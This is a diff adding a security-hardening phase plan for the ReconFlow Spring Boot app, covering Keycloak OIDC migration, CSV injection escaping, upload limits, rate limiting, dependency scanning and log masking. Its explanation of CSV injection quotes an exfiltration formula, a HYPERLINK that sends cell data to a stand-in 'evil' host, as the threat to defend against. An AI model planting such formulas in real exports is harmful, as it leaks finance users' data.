@@ -1,0 +1,881 @@
+# Phase M10 — Security hardening
+
+**Status:** Not started · **Tasks:** TASKS.md M10.1–M10.7 · **Depends on:** M3 (auth, tenant context, RLS), M5 (uploads), M8 (CSV export), M9 (rate-sensitive endpoints, metrics) · **Date:** 2026-11-01
+
+By this point the system works end to end. M10 doesn't add features; it removes ways to abuse the features that exist. Every control added here has to be backed by a test or a config file, linked from `docs/security.md`. A control that you can't point to is a control you only think you have.
+
+---
+
+## 1. Goal
+
+When M10 is finished:
+
+- Login is delegated to Keycloak over OIDC, and **only the `security/` package changed** to make that happen (or you have written down exactly what else changed, and why).
+- Exported CSVs can't execute formulas when a finance user opens them in Excel.
+- Oversized uploads are rejected by the servlet container before the application reads a byte of them.
+- Upload and run endpoints are rate limited per organization and per user.
+- Every PR is checked for vulnerable dependencies.
+- Logs contain no passwords, tokens, raw rows, or unmasked references and emails.
+- The application connects to PostgreSQL as a role that can't change the schema, can't rewrite audit history, and **is subject to row-level security**.
+- `docs/security.md` lists every control, the threat it addresses, the config that enforces it, and the test that proves it.
+
+---
+
+## 2. Concepts to understand first
+
+### 2.1 Defense in depth
+
+No single control is trusted to be perfect. Tenant isolation already has three layers (membership check, `organization_id` in every query, RLS). Upload size has three (reverse proxy, servlet container, application). The question to ask of every control is: *if this layer has a bug, what stops the attack?* If the answer is "nothing", add a layer or accept the risk in writing.
+
+### 2.2 OAuth 2.0 vs OpenID Connect
+
+- **OAuth 2.0** is about *delegated authorization*: a client gets an access token to call an API.
+- **OIDC** is a thin layer on top that adds *authentication*: an `id_token` that says who logged in, a `userinfo` endpoint, and a discovery document at `/.well-known/openid-configuration`.
+- ReconFlow's API is a **resource server**: it never sees a password. It receives a bearer access token, checks the signature against the issuer's public keys (the JWKS), and checks `iss`, `aud` and `exp`. That is exactly what it already does with its own tokens (plans/authentication.plan §6), which is why the switch is small.
+
+### 2.3 Least privilege at the database
+
+Whoever *owns* a table can do anything to it: drop it, alter it, disable its triggers and, importantly, **bypass its row-level security policies**. PostgreSQL applies RLS to every role except superusers, roles with `BYPASSRLS`, and the table owner (unless the table has `FORCE ROW LEVEL SECURITY`). If the application connects as the role that ran the migrations, the RLS policies from M3.5 are decoration. Separate roles are what make them real.
+
+### 2.4 Rate limiting: token bucket
+
+A bucket holds up to `capacity` tokens and refills at a fixed rate. Each request takes one token; an empty bucket means `429 Too Many Requests`. It allows short bursts (up to `capacity`) while capping the long-run average. Alternatives you should be able to name: fixed window (simple, but allows 2× bursts at window edges), sliding window log (exact, memory-heavy), sliding window counter (a good approximation). Bucket4j implements token buckets.
+
+### 2.5 CSV (formula) injection
+
+Spreadsheet programs treat a cell that begins with `=`, `+`, `-` or `@` as a formula. A gateway file can contain a reference like `=HYPERLINK("http://evil/?x="&A2,"click")`, and when a finance user opens the exception export in Excel, the formula runs on *their* machine with *their* data. The server is never compromised, which is why this one is easy to miss. The defense is to make such cells inert text on output.
+
+### 2.6 Supply-chain risk
+
+Most code in the running jar isn't yours. A vulnerable transitive dependency (Log4Shell is the canonical example) is as exploitable as a bug you wrote. You need two things: **automatic updates** (Dependabot) and a **gate** that blocks known-vulnerable versions from merging (dependency review or OWASP Dependency-Check).
+
+---
+
+## 3. Starting point
+
+Assumed from earlier phases:
+
+- In-house auth from M3.3 (`security/auth`, `security/token`, `refresh_token`, RS256 keys).
+- `TenantContextFilter`, `CurrentUser`, `TenantContext`, `RolePermissions` (plans/authentication.plan §4.2, §5, §6).
+- RLS policies from M3.5 using `SET LOCAL app.org_id`.
+- `compose.yaml` with PostgreSQL and MinIO (M2.4); CI workflow (M2.15); JSON logging in `prod` (M2.12).
+- `POST /api/v1/imports` (M5.7), CSV export of exceptions (M8.4), `POST /api/v1/reconciliation-runs` (M6.14).
+
+**Recommended order** (not the ID order):
+
+1. M10.5 dependency scanning: cheap, and it protects every later PR.
+2. M10.7 database roles: it changes how every test connects and proves RLS actually works. Do it before anything else that touches the DB.
+3. M10.3, M10.2, M10.4, M10.6: small, independent.
+4. M10.1 Keycloak: the largest change; do it last, on a stable base.
+5. `docs/security.md`: written as you go, finished last.
+
+Branch per task: `feat/M10.7-db-roles`, commit messages like `feat(security): M10.7 separate migrator and app roles`.
+
+---
+
+## 4. Step by step
+
+### M10.1 — Migrate login to OIDC with Keycloak
+
+**What.** Keycloak issues tokens; ReconFlow only validates them. Users, passwords, lockout, MFA and refresh tokens move to Keycloak. Organizations, memberships, roles and permissions stay in ReconFlow's database.
+
+**Why.** Building auth in M3.3 taught you how it works. Running it in production means owning password storage, brute-force defense, MFA, account recovery and every future CVE in that code. An identity provider does this as its whole job. The exercise also tests your design: plans/authentication.plan §9 predicted that only `security/` would change.
+
+**How.**
+
+**Step 1 — Keycloak in Compose.**
+
+```yaml
+# compose.yaml (add)
+  keycloak:
+    image: quay.io/keycloak/keycloak:26.4   # pin the exact current 26.x patch; never :latest
+    command: ["start-dev", "--import-realm"]
+    environment:
+      KC_BOOTSTRAP_ADMIN_USERNAME: admin
+      KC_BOOTSTRAP_ADMIN_PASSWORD: ${KEYCLOAK_ADMIN_PASSWORD:?set in .env}
+      KC_HOSTNAME: http://localhost:8180     # one issuer URL for browser AND containers (see Pitfalls)
+      KC_HTTP_PORT: 8180
+      KC_HEALTH_ENABLED: "true"
+    ports: ["8180:8180"]
+    volumes:
+      - ./infra/keycloak/realm-reconflow.json:/opt/keycloak/data/import/realm-reconflow.json:ro
+    healthcheck:
+      test: ["CMD-SHELL", "exec 3<>/dev/tcp/localhost/9000 && echo -e 'GET /health/ready HTTP/1.1\\r\\nHost: localhost\\r\\nConnection: close\\r\\n\\r\\n' >&3 && grep -q 'UP' <&3"]
+      interval: 10s
+      retries: 30
+```
+
+`start-dev` uses an embedded H2 database and HTTP, which is fine locally. In a deployed environment Keycloak runs with `start`, its own PostgreSQL database, and TLS (see phase M11). The health endpoint is on the management port 9000 in Keycloak 25+; the image has no curl, hence the bash `/dev/tcp` trick. Verify both against the Keycloak version you pin.
+
+**Step 2 — The realm, as code.** `infra/keycloak/realm-reconflow.json` is committed, so the realm is reproducible. Create it once in the admin console, export it (`kc.sh export --realm reconflow --users realm_file`), then trim it. It must contain:
+
+| Setting | Value | Why |
+|---|---|---|
+| Realm | `reconflow` | Issuer becomes `http://localhost:8180/realms/reconflow` |
+| Client `reconflow-web` | Public, standard flow (authorization code) + PKCE `S256`, redirect URIs for the future UI | The browser can't keep a client secret, so it uses PKCE instead |
+| Client `reconflow-demo` | Public, **direct access grants on**, local realm only | Lets `scripts/demo.sh` and Bruno get a token with a username and password. The password grant is removed in OAuth 2.1; never enable it in a deployed realm |
+| Audience mapper | On both clients: add `reconflow-api` to `aud` | Keycloak's default `aud` is `account`; without this the API rejects every token (see Pitfalls) |
+| Access token lifespan | 15 min | Same as M3.3 |
+| Refresh token rotation | "Revoke Refresh Token" on, max reuse 0 | Same rotation and reuse semantics you built in M3.3c |
+| Brute force detection | On: 5 failures, temporary lockout 15 min | Replaces `LoginAttemptService` |
+| Password policy | `length(12) and maxLength(64) and notUsername` | NIST 800-63B, as in plans/authentication.plan §8 |
+| Required actions | "Update Password" on new users | Replaces `must_change_password` (M3.3g) |
+| Events | Login events + admin events enabled | Replaces the login/lockout audit events from M3.3h |
+| Users (local realm only) | One user per role per demo org, **with fixed `id` values** | Fixed ids make `sub` deterministic, so the seeder can link them (Step 4) |
+
+No roles, groups or organizations go into Keycloak. Keycloak answers *who are you*; ReconFlow answers *what may you do, in which organization* (plans/authentication.plan §1). Putting roles in the token would bring back the "revocation waits for token expiry" problem that §3 of the auth plan deliberately avoided.
+
+**Step 3 — Point the resource server at Keycloak.**
+
+```yaml
+# application.yml
+spring:
+  security:
+    oauth2:
+      resourceserver:
+        jwt:
+          issuer-uri: ${OIDC_ISSUER_URI:http://localhost:8180/realms/reconflow}
+          audiences: reconflow-api
+```
+
+With `issuer-uri`, Spring fetches the discovery document on first use, finds `jwks_uri`, caches Keycloak's public keys, and re-fetches them when it sees an unknown `kid`, so key rotation in Keycloak needs no change in ReconFlow. `audiences` makes the decoder reject tokens issued for other clients. Delete `JwtKeyConfig`, the RSA key pair and the `NimbusJwtEncoder` bean.
+
+**Step 4 — Map Keycloak users to `app_user`.**
+
+Decision: **link by `sub`, stored in a new `external_subject` column.** Email is only used once, to link a pre-provisioned user on their first login, and only if Keycloak says the email is verified.
+
+Why not just match by email every time? Emails change, and an attacker who can register *any* account with your email address in the IdP (unverified) would become you. `sub` is stable and issued by the IdP, so it's the only safe key.
+
+```sql
+-- V<next>__app_user_external_subject.sql   (next free version number)
+-- Expand step: nothing is removed yet, so the M3.3 login path still works
+-- if the cutover is rolled back.
+ALTER TABLE app_user ADD COLUMN external_subject TEXT;
+
+CREATE UNIQUE INDEX app_user_external_subject_uk
+    ON app_user (external_subject) WHERE external_subject IS NOT NULL;
+
+-- New users are created in Keycloak and have no password here.
+ALTER TABLE app_user ALTER COLUMN password_hash DROP NOT NULL;
+```
+
+Inside `security/tenant`, introduce one interface so that the filter doesn't care where users come from:
+
+```java
+// security/tenant/PrincipalResolver.java
+public interface PrincipalResolver {
+    /** Maps a validated token to our user id, or empty if the user is unknown or not allowed. */
+    Optional<UUID> resolveUserId(Jwt jwt);
+}
+
+// security/tenant/OidcPrincipalResolver.java
+@Component
+class OidcPrincipalResolver implements PrincipalResolver {
+    private final AppUserLookup users;
+    private final AuditService audit;
+
+    @Override
+    @Transactional
+    public Optional<UUID> resolveUserId(Jwt jwt) {
+        String sub = jwt.getSubject();
+        Optional<UUID> linked = users.findIdByExternalSubject(sub);
+        if (linked.isPresent()) return linked;
+
+        // First login of a user an org admin pre-provisioned in ReconFlow.
+        if (!Boolean.TRUE.equals(jwt.getClaimAsBoolean("email_verified"))) return Optional.empty();
+        String email = jwt.getClaimAsString("email");
+        return users.linkByEmailIfUnlinked(email, sub)          // UPDATE ... WHERE lower(email)=lower(?) AND external_subject IS NULL
+                    .map(id -> { audit.record(AuditAction.USER_LINKED, "APP_USER", id, Map.of()); return id; });
+    }
+}
+```
+
+`TenantContextFilter` previously did `UUID.fromString(jwt.getSubject())`. It now calls `principalResolver.resolveUserId(jwt)` and returns `401` on empty. Everything after that — the `app_user ⨝ membership` join, `X-Organization-Id`, platform mode, permissions — is unchanged. Because `CurrentUser.id()` is still *our* UUID, not Keycloak's `sub`, no business module notices.
+
+The one-request cost is one extra indexed lookup by `external_subject`. If you want to avoid it, cache `sub → userId` in a small Caffeine cache with a short TTL; it isn't needed at 35 req/s.
+
+**Step 5 — Cut over without logging everyone out.** During the migration window, accept tokens from both issuers:
+
+```java
+@Bean
+AuthenticationManagerResolver<HttpServletRequest> authenticationManagerResolver(
+        @Value("${reconflow.auth.trusted-issuers}") List<String> issuers) {
+    return JwtIssuerAuthenticationManagerResolver.fromTrustedIssuers(issuers);
+}
+// http.oauth2ResourceServer(o -> o.authenticationManagerResolver(authenticationManagerResolver))
+```
+
+`fromTrustedIssuers` reads the unverified `iss` claim only to pick which decoder to use, then verifies the token fully with that issuer's keys. Remove the old issuer after one access-token lifetime past the last in-house login. For this project you can also skip the dual period and just switch, but be able to explain how you would do it for real users.
+
+**Step 6 — Delete what Keycloak replaces** (plans/authentication.plan §9):
+
+- `AuthController` (`/auth/login`, `/auth/refresh`, `/auth/logout`, `/auth/change-password`), `AuthService`, `LoginAttemptService`, `PasswordPolicy`, `AccessTokenService`, `RefreshTokenService`, `TokenHasher`, `JwtKeyConfig`, the refresh-token sweeper.
+- Their tests (M3.3j). Keep a short note in the ADR of which behaviours they proved and which Keycloak setting now provides each one.
+- User management (M3.3g): `POST /api/v1/members` now (a) creates the user in Keycloak through its Admin REST API with a temporary password and the "Update Password" required action, then (b) inserts `app_user` with `external_subject` = the returned id, and the `membership`. If (b) fails, delete the Keycloak user (compensating action); you can't have one transaction across two systems. Use `org.keycloak:keycloak-admin-client` with a confidential service-account client that has only the `manage-users` role.
+
+**Step 7 — Contract, one release later.**
+
+```sql
+-- V<next>__drop_in_house_auth.sql
+-- Contract step. Only after the Keycloak cutover has run cleanly for a release:
+-- before this, rolling back to in-house login is still possible.
+DROP TABLE refresh_token;
+ALTER TABLE app_user DROP COLUMN password_hash,
+                     DROP COLUMN failed_login_count,
+                     DROP COLUMN locked_until,
+                     DROP COLUMN must_change_password;
+```
+
+**Step 8 — Write the comparison ADR**, `docs/adr/NNNN-delegate-authentication-to-keycloak.md`:
+
+1. **Context.** What M3.3 built, and why (learning).
+2. **Options.** Keep in-house · self-hosted Keycloak · managed IdP (Auth0, Cognito, Entra ID).
+3. **What we built in M3.3.** Lines of code, number of tests, the four defects the auth plan's reviews caught (§12–13) — evidence of how easy it is to get wrong.
+4. **What Keycloak gives us.** MFA, SSO, password reset by email, brute-force detection, admin console, social login, event log, standards compliance, security patches from a dedicated team.
+5. **What each costs.** In-house: the security liability and maintenance. Keycloak: another stateful service with its own database, upgrades every few months, ~512 MB–1 GB RAM, realm config to keep in git, a learning curve. Managed IdP: money per active user and vendor lock-in, but no operations.
+6. **What changed outside `security/`.** The honest list. Expected: `compose.yaml`, the `members` endpoint's implementation, `scripts/demo.sh`, the Bruno collection. If a business module changed, explain why the abstraction leaked.
+7. **Decision and consequences.**
+
+**Pitfalls.**
+
+- **Issuer mismatch.** The browser reaches Keycloak at `localhost:8180`, the app container at `keycloak:8180`. Keycloak puts whatever hostname it was reached on into `iss`, so tokens fail validation with `401` and a confusing log line. Fix: set `KC_HOSTNAME` so `iss` is always the same, and make that URL reachable from the app container too (on Linux add `extra_hosts: ["localhost:host-gateway"]`, or use a hostname like `keycloak.localtest.me` everywhere).
+- **Missing audience.** Default Keycloak access tokens have `aud: ["account"]`. With `audiences: reconflow-api` every request is `401`. Add the audience mapper.
+- **Startup ordering.** With `issuer-uri`, Boot fetches discovery lazily on the first request, so the app starts even if Keycloak isn't up yet; the first requests fail instead. Make `depends_on: keycloak: condition: service_healthy` in Compose.
+- **Linking by unverified email** is an account takeover. Never.
+- **Testing against a real Keycloak in every test** is slow. Most tests should use `spring-security-test`'s `jwt()` request post-processor; only a handful of end-to-end tests need the container.
+- **Password hashes.** Keycloak doesn't verify bcrypt hashes out of the box (verify the providers in your version), so existing users can't be migrated with their passwords. For this project, give them a temporary password and the "Update Password" action.
+
+**Done when.**
+
+- `docker compose up` starts Keycloak with the imported realm, and a token from `reconflow-demo` works against `GET /api/v1/exceptions`.
+- The whole cross-tenant suite (M3.9, M7.18) passes **without modification**.
+- A token for a user with no `app_user` row gets `401`; a token without `reconflow-api` in `aud` gets `401`; a token from another issuer gets `401`.
+- The in-house auth classes and tests are deleted; the contract migration is written (it may ship a release later).
+- The ADR is merged, including the "what changed outside `security/`" list.
+
+---
+
+### M10.2 — CSV injection protection on export
+
+**What.** Every free-text cell written to an exported CSV that begins with `=`, `+`, `-`, `@`, a tab (`0x09`) or a carriage return (`0x0D`) is prefixed with a single quote `'`, and every cell is quoted.
+
+**Why.** See §2.5. Tab and CR are on the list because some spreadsheet programs strip leading whitespace and then evaluate what follows. The `'` prefix is the convention Excel itself uses to mean "this is text"; it is shown in the formula bar but not in the cell. Quoting the cell stops embedded commas and newlines from breaking the row structure, which is a separate bug that can also be abused.
+
+**How.**
+
+```java
+// shared/csv/SpreadsheetSafe.java
+public final class SpreadsheetSafe {
+    private static final String DANGEROUS_FIRST_CHARS = "=+-@\t\r";
+
+    private SpreadsheetSafe() {}
+
+    /** For free text from users or source files. Never for numbers we formatted ourselves. */
+    public static String text(String value) {
+        if (value == null || value.isEmpty()) return value;
+        return DANGEROUS_FIRST_CHARS.indexOf(value.charAt(0)) >= 0 ? "'" + value : value;
+    }
+}
+```
+
+```java
+// reporting/export/ExceptionCsvExporter.java (excerpt)
+CSVFormat format = CSVFormat.DEFAULT.builder()
+        .setHeader("exception_id", "type", "status", "reference", "amount", "currency", "assignee", "resolution_note")
+        .setQuoteMode(QuoteMode.ALL)
+        .get();   // .build() on older Commons CSV versions
+
+try (CSVPrinter out = new CSVPrinter(writer, format)) {
+    for (ExceptionRow r : rows) {
+        out.printRecord(
+            r.id(),                                    // UUID: generated by us, safe
+            r.type(), r.status(),                      // enum names: safe
+            SpreadsheetSafe.text(r.rawReference()),    // came from a file: escape
+            r.amount().toPlainString(),                // BigDecimal we formatted: do NOT escape
+            r.currency(),
+            SpreadsheetSafe.text(r.assigneeName()),    // user-controlled: escape
+            SpreadsheetSafe.text(r.resolutionNote())); // user-controlled: escape
+    }
+}
+```
+
+Decide per column, not per cell. A negative amount like `-12.5000` starts with `-`; escaping it would turn a number into text and break the finance user's `SUM()`. It's safe to leave because the value is produced by `BigDecimal.toPlainString()`, which can only emit digits, a sign and a dot. The rule is: **escape every column whose content an outsider can influence; never escape columns the server formatted from typed values.**
+
+Also set `Content-Type: text/csv; charset=UTF-8`, `Content-Disposition: attachment; filename="exceptions-<runId>.csv"`, and `X-Content-Type-Options: nosniff` (Spring Security adds the last one by default). Write a UTF-8 BOM if users open the file in Excel on Windows, or non-ASCII names come out garbled.
+
+**Pitfalls.** Escaping in the importer instead of the exporter (you'd corrupt the stored raw values, which M5.12 promised to keep intact). Forgetting that M8 may have more than one export. Escaping numbers.
+
+**Done when.** A unit test covers each of the six dangerous first characters plus a safe value, `null` and the empty string; an integration test imports a gateway file with a reference `=1+1`, runs reconciliation, exports, and asserts the cell is `"'=1+1"` while the amount column is still numeric.
+
+---
+
+### M10.3 — Upload limits at the servlet level
+
+**What.** The servlet container rejects multipart requests above the limit before the controller runs. The code checks from M5.7 (size, content type, headers, row count) stay.
+
+**Why.** If only the controller checks size, Tomcat has already received and written the whole file to a temp directory by the time your code sees it. A few concurrent 5 GB uploads fill the disk. Limits belong at every layer that buffers data: the reverse proxy, the container, then the application.
+
+**How.**
+
+```yaml
+# application.yml
+spring:
+  servlet:
+    multipart:
+      max-file-size: ${RECONFLOW_MAX_UPLOAD:50MB}     # must match the M1.3 CSV contract
+      max-request-size: ${RECONFLOW_MAX_REQUEST:51MB} # file + form fields
+      file-size-threshold: 1MB                        # bigger parts go to disk, not heap
+      location: ${java.io.tmpdir}/reconflow-uploads
+
+server:
+  tomcat:
+    max-swallow-size: 2MB          # how much of a rejected body Tomcat still reads before closing the connection
+    max-http-form-post-size: 2MB   # non-multipart form posts
+    connection-timeout: 20s        # slow-loris style uploads
+```
+
+Verify these property names against the Boot 4 configuration reference; the embedded-server properties have moved between modules before.
+
+Turn the container's exception into a `ProblemDetail` in the global advice from M2.10:
+
+```java
+@ExceptionHandler(MaxUploadSizeExceededException.class)
+ProblemDetail uploadTooLarge(MaxUploadSizeExceededException e) {
+    ProblemDetail pd = ProblemDetail.forStatusAndDetail(HttpStatus.CONTENT_TOO_LARGE,
+            "The file is larger than the maximum of " + maxUpload + ".");
+    pd.setType(URI.create("https://reconflow.dev/problems/upload-too-large"));
+    return pd;
+}
+```
+
+(`CONTENT_TOO_LARGE` is 413; on older Spring versions the constant is `PAYLOAD_TOO_LARGE`.) Set the matching limit at the edge too: nginx `client_max_body_size`, or the PaaS limit, documented in `docs/security.md`.
+
+Since files go to S3-compatible storage (M5.8), stream the part's `InputStream` straight to the `FileStorage` while computing the SHA-256, rather than calling `getBytes()`.
+
+**Pitfalls.** `max-request-size` smaller than `max-file-size` (every max-size upload fails). A huge `max-swallow-size` (Tomcat keeps reading the attacker's body); a tiny one (the client sees a connection reset instead of a readable 413 — that trade-off is why the default is 2 MB). Limits that disagree with the documented CSV contract.
+
+**Done when.** An integration test posts a file 1 byte over the limit and gets `413` with a `ProblemDetail`, and no batch row and no stored object exist afterwards. A file exactly at the limit is accepted.
+
+---
+
+### M10.4 — Rate limiting on upload and run endpoints
+
+**What.** Per-user and per-organization limits on `POST /api/v1/imports` and `POST /api/v1/reconciliation-runs`, plus a hard cap on queued jobs per organization. Exceeding either returns `429` with `Retry-After`.
+
+**Why.** These two endpoints create background work. Without limits, one client in a retry loop can fill the job queue and, despite the per-org fairness from docs/scalability.md §4.2, delay every other tenant and grow storage. Login is already limited (M3.3f; after M10.1, by Keycloak's brute-force detection).
+
+**How.** Two layers, because they protect different things.
+
+**Layer 1 — request rate (Bucket4j, in memory).**
+
+```xml
+<dependency>
+    <groupId>com.bucket4j</groupId>
+    <artifactId>bucket4j_jdk17-core</artifactId>   <!-- artifact name changed in 8.x; check the current one -->
+    <version>${bucket4j.version}</version>
+</dependency>
+<dependency>
+    <groupId>com.github.ben-manes.caffeine</groupId>
+    <artifactId>caffeine</artifactId>               <!-- version managed by Boot -->
+</dependency>
+```
+
+```java
+// shared/ratelimit/RateLimited.java
+@Target(METHOD) @Retention(RUNTIME)
+public @interface RateLimited { RateLimitPolicy value(); }
+
+// shared/ratelimit/RateLimitPolicy.java
+public enum RateLimitPolicy {
+    IMPORT_UPLOAD(10, Duration.ofMinutes(1)),   // per user
+    RUN_CREATE(20, Duration.ofMinutes(1));      // per user
+    final int capacity; final Duration period;
+    RateLimitPolicy(int capacity, Duration period) { this.capacity = capacity; this.period = period; }
+}
+
+// shared/ratelimit/RateLimitInterceptor.java
+@Component
+class RateLimitInterceptor implements HandlerInterceptor {
+    private final Cache<String, Bucket> buckets = Caffeine.newBuilder()
+            .maximumSize(100_000)                    // bounded: keys come from users
+            .expireAfterAccess(Duration.ofHours(1))
+            .build();
+    private final CurrentUser currentUser;
+    private final TenantContext tenant;
+
+    @Override
+    public boolean preHandle(HttpServletRequest req, HttpServletResponse res, Object handler) {
+        if (!(handler instanceof HandlerMethod hm)) return true;
+        RateLimited rl = hm.getMethodAnnotation(RateLimited.class);
+        if (rl == null) return true;
+
+        RateLimitPolicy p = rl.value();
+        String key = p.name() + ':' + tenant.organizationId() + ':' + currentUser.id();
+        Bucket bucket = buckets.get(key, k -> Bucket.builder()
+                .addLimit(l -> l.capacity(p.capacity).refillGreedy(p.capacity, p.period))
+                .build());
+
+        ConsumptionProbe probe = bucket.tryConsumeAndReturnRemaining(1);
+        if (probe.isConsumed()) {
+            res.setHeader("RateLimit-Remaining", Long.toString(probe.getRemainingTokens()));
+            return true;
+        }
+        throw new RateLimitExceededException(Duration.ofNanos(probe.getNanosToWaitForRefill()));
+    }
+}
+```
+
+The advice maps `RateLimitExceededException` to `429` with `Retry-After: <seconds>` and a `ProblemDetail`. Register the interceptor in a `WebMvcConfigurer`. The interceptor runs after the security filters, so `CurrentUser` and `TenantContext` are populated.
+
+**The multi-instance caveat.** Each API instance has its own buckets. With two instances behind a round-robin load balancer, a user effectively gets twice the configured rate. That's acceptable here *because layer 2 is exact*. The alternatives, and when you'd pick them:
+
+| Option | Exact across instances? | Cost |
+|---|---|---|
+| In-memory per instance (chosen) | No, N× the limit | None |
+| Set the per-instance limit to limit ÷ N | Roughly, if the LB spreads evenly | Breaks when you scale N |
+| Bucket4j with a PostgreSQL backend (`bucket4j-postgresql`) | Yes | A row lock and a write per limited request; fine for low-volume endpoints like these |
+| Redis-backed (Bucket4j or the gateway) | Yes | A new piece of infrastructure, rejected in docs/scalability.md D8 until measured |
+| At the API gateway / load balancer (nginx `limit_req`, Cloudflare) | Per gateway node | Can't see the org or user unless you decode the token at the edge; good for per-IP limits |
+
+**Layer 2 — queue depth (exact, in the database).** At enqueue time, in the same transaction that inserts the `job` row:
+
+```java
+// ingestion/ImportService.java (excerpt)
+jdbc.queryForObject("SELECT pg_advisory_xact_lock(hashtextextended(?, 0))", Object.class,
+                    "job-quota:" + orgId);          // serialise enqueues per org, released at commit
+int pending = jdbc.queryForObject("""
+        SELECT count(*) FROM job
+         WHERE organization_id = ? AND status IN ('QUEUED', 'RUNNING')""", Integer.class, orgId);
+if (pending >= props.maxPendingJobsPerOrg()) {      // e.g. 50
+    throw new RateLimitExceededException(Duration.ofSeconds(30));
+}
+```
+
+Without the advisory lock, two concurrent requests both count 49 and both insert, giving 51. The lock makes the check-then-insert atomic per organization without locking the whole table. (`hashtextextended` returns a `bigint`, which is what the advisory lock takes; verify the function in PostgreSQL 16.)
+
+**Pitfalls.** Keying on IP address for authenticated endpoints (an office behind one NAT shares a limit; a botnet doesn't). Trusting `X-Forwarded-For` from anyone: set `server.forward-headers-strategy=native` and make sure only your proxy can reach the app. An unbounded bucket map keyed by user input (memory exhaustion). Returning `429` without `Retry-After` (clients retry immediately).
+
+**Done when.** A test fires `capacity + 1` uploads as one user and gets exactly one `429` with `Retry-After`; another user in the same org is unaffected. A concurrency test enqueues from 10 threads at `cap - 1` pending and ends with exactly `cap` pending jobs.
+
+---
+
+### M10.5 — Dependency vulnerability scanning in CI
+
+**What.** Dependabot opens update PRs weekly; every PR is checked for newly introduced vulnerable dependencies; a scheduled full scan runs OWASP Dependency-Check against everything.
+
+**Why.** Two different questions: "did this PR add something vulnerable?" (fast, on every PR) and "has anything we already ship become vulnerable since?" (slow, nightly or weekly, because new CVEs appear for old versions).
+
+**How.**
+
+```yaml
+# .github/dependabot.yml
+version: 2
+updates:
+  - package-ecosystem: maven
+    directory: /
+    schedule: { interval: weekly }
+    open-pull-requests-limit: 5
+    groups:
+      spring:      { patterns: ["org.springframework*"] }
+      testing:     { patterns: ["org.testcontainers*", "org.junit*", "org.assertj*"] }
+  - package-ecosystem: github-actions
+    directory: /
+    schedule: { interval: weekly }
+  - package-ecosystem: docker           # the Dockerfile from M11.1
+    directory: /
+    schedule: { interval: weekly }
+```
+
+```yaml
+# .github/workflows/dependency-review.yml
+name: dependency-review
+on: pull_request
+permissions:
+  contents: read
+  pull-requests: write
+jobs:
+  review:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/dependency-review-action@v4
+        with:
+          fail-on-severity: high
+          comment-summary-in-pr: on-failure
+```
+
+Dependency review is free on public repositories (private ones need GitHub Advanced Security). It uses GitHub's dependency graph; for Maven the static graph doesn't always see transitive dependencies, so add `advanced-security/maven-dependency-submission-action` on pushes to `main` to submit the resolved tree.
+
+```yaml
+# .github/workflows/dependency-check.yml
+name: owasp-dependency-check
+on:
+  schedule: [{ cron: "0 3 * * 1" }]   # Mondays 03:00 UTC
+  workflow_dispatch:
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-java@v4
+        with: { distribution: temurin, java-version: "25", cache: maven }
+      - uses: actions/cache@v4
+        with:
+          path: ~/.m2/repository/org/owasp/dependency-check-data
+          key: dc-data-${{ github.run_id }}
+          restore-keys: dc-data-
+      - run: >
+          ./mvnw -B org.owasp:dependency-check-maven:check
+          -DfailBuildOnCVSS=7
+          -DnvdApiKey=${{ secrets.NVD_API_KEY }}
+          -DsuppressionFile=config/dependency-check-suppressions.xml
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with: { name: dependency-check-report, path: target/dependency-check-report.html }
+```
+
+Request a free NVD API key; without it the first data download takes very long or is rate-limited. Every suppression in `config/dependency-check-suppressions.xml` needs a `<notes>` explaining why the CVE doesn't apply and an `until="YYYY-MM-DD"` expiry so it gets reviewed again.
+
+Also turn on, in the GitHub repository settings: **secret scanning with push protection** (blocks committing keys) and **Dependabot security updates**. In M11, add an image scan (e.g. Trivy) to the image job, because the base image has OS packages too.
+
+Pin third-party actions to a commit SHA rather than a tag if you want to be strict; Dependabot's `github-actions` ecosystem will keep the SHAs updated.
+
+**Pitfalls.** A gate so noisy (`fail-on-severity: low`) that people learn to ignore it. Suppressions with no expiry. Running Dependency-Check on every PR (minutes per run, mostly downloading the CVE database).
+
+**Done when.** Dependabot PRs appear; a test PR that adds a known-vulnerable version (e.g. an old `commons-text` with CVE-2022-42889) is blocked by dependency review; the weekly scan has run once and its report is attached.
+
+---
+
+### M10.6 — Review logs for PII and financial data
+
+**What.** A written logging policy, masking helpers used at the call site, and a test that fails if sensitive canary values ever appear in the logs.
+
+**Why.** Logs are copied to more places, kept longer and read by more people than the database. A reference number or an email in a log line is personal or financial data that has escaped every access control you built, including tenant isolation.
+
+**How.**
+
+**1. The policy** (in `docs/security.md`):
+
+| Category | Examples | Rule |
+|---|---|---|
+| Always fine | Our UUIDs, `organization_id`, `request_id`, status names, counts, durations, error codes | Log freely |
+| Mask | Transaction references, emails, display names, client IPs | `****1234`, `j***@example.com`; IPs only in access logs with short retention |
+| Never | Passwords, tokens (access, refresh, Keycloak client secrets), `Authorization` and `Cookie` headers, raw CSV rows, file contents, amounts tied to a reference, S3 keys, DB passwords | Not even at DEBUG |
+
+**2. Mask at the source.** It's the only reliable approach; a regex in the logging pipeline can't know that `PAY-0001234` is a reference.
+
+```java
+// shared/logging/Masked.java
+public final class Masked {
+    private Masked() {}
+
+    public static String reference(String ref) {
+        if (ref == null) return null;
+        return ref.length() <= 4 ? "****" : "****" + ref.substring(ref.length() - 4);
+    }
+
+    public static String email(String email) {
+        if (email == null) return null;
+        int at = email.indexOf('@');
+        return at <= 1 ? "***" + email.substring(Math.max(at, 0)) : email.charAt(0) + "***" + email.substring(at);
+    }
+}
+
+log.info("Row rejected batch={} row={} code={} reference={}",
+         batchId, rowNumber, code, Masked.reference(rawReference));
+```
+
+**3. Find the leaks that don't come from your own `log` calls.**
+
+- **Database errors.** PostgreSQL's unique-violation message includes the values: `Key (lower(email))=(jane@acme.com) already exists`. Translate constraint violations you expect into domain exceptions *before* they're logged, and make sure the `ProblemDetail` for an unexpected `DataIntegrityViolationException` carries a generic message, never `e.getMessage()`.
+- **Hibernate SQL logging** with bind parameters (`org.hibernate.orm.jdbc.bind=TRACE`) must be off in every non-local profile.
+- **Request logging.** If you added a request-logging filter, it must never log bodies (uploads are raw rows) or the `Authorization`/`Cookie` headers.
+- **Exception messages from your own code** that interpolate values (`"Duplicate reference " + ref`).
